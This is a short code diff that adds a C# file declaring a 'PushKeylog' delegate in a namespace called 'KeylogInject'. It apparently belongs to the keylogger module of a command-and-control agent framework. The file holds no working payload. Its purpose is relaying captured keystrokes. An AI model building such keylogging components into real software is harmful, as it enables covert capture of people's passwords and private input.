@@ -1,0 +1,9 @@
+﻿using PhantomInterop.Interfaces;
+
+namespace KeylogInject
+{
+    public static class Delegates
+    {
+        public delegate bool PushKeylog(ICommandMessage info);
+    }
+}
